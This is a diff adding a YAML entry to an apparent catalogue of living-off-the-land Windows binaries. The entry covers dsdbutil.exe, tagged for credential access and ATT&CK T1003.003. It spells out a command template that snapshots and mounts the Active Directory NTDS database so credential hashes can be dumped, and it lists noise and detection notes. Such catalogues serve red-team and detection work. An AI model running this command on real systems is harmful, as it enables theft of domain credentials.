@@ -1,0 +1,28 @@
+id: lolbas/dsdbutil/dump/1
+type: binary
+platform: windows
+name: dsdbutil.exe
+phases:
+- credential-access
+capabilities:
+- credential-dump
+privilege_required: admin
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0 (verify upstream LICENSE)
+  upstream_version: 9c5e384
+  last_synced: '2026-08-25'
+attack_techniques:
+- T1003.003
+opsec:
+  noise: high
+  triggers: Event ID 4688
+commands:
+- template: dsdbutil.exe "activate instance ntds" "snapshot" "mount {GUID}" "quit" "quit"
+  comment: Mounting the snapshot with its GUID
+references:
+- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dsdbutil/
+tags:
+- windows
+- lolbas
